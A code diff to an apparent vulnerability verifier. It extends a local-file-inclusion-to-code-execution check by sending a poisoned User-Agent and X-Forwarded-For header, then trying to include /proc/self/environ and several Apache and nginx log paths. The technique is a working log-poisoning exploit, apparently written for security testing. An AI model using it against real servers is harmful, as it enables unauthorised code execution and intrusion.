@@ -2861,16 +2861,24 @@ def verify_generic_lfi_rce(
         try:
             _http_request("GET", base_url + "/", timeout=15,
                           headers={"User-Agent": poison_ua})
+            # /proc/self/environ also reflects X-Forwarded-For; cover configs that strip UA
+            try:
+                _http_request("GET", base_url + "/", timeout=15,
+                              headers={"X-Forwarded-For": poison_ua})
+            except Exception:
+                pass
         except Exception as e:
             res.detail = f"la peticion de envenenamiento del log fallo: {e}"
             return res
         time.sleep(1)
 
         m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
-        # rutas de log mas comunes de Apache/nginx en imagenes oficiales de Docker, con y sin
-        # profundidad de traversal (el mismo parametro puede ser vulnerable a traversal Y a LFI
-        # a la vez, o solo aceptar la ruta absoluta sin mas).
+        # /proc/self/environ is always present in Docker and reflects HTTP_USER_AGENT
+        # (and HTTP_X_FORWARDED_FOR) — no log files needed. Classic access.log paths
+        # often don't exist because Docker images pipe logs to stdout/stderr.
         log_paths = [
+            "/proc/self/environ",
+            "/var/log/apache2/error.log",
             "/var/log/apache2/access.log", "/var/log/apache2/other_vhosts_access.log",
             "/var/log/httpd/access_log", "/var/log/nginx/access.log",
             "/usr/local/apache2/logs/access_log",
